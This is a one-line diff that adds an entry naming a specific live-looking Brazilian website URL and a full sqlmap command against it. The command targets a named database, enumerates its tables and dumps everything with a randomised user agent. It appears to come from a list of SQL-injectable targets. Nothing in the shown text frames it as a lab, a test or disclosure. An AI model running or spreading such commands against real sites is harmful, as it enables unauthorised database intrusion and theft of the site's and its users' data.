@@ -1,0 +1,1 @@
+http://www.cepontodepartida.com.br/?p=2 (GET)  # sqlmap.py -u http://www.cepontodepartida.com.br/?p=2 -D aljava_pontodepartida --tables --threads 5 -v3 --random-agent --dump-all
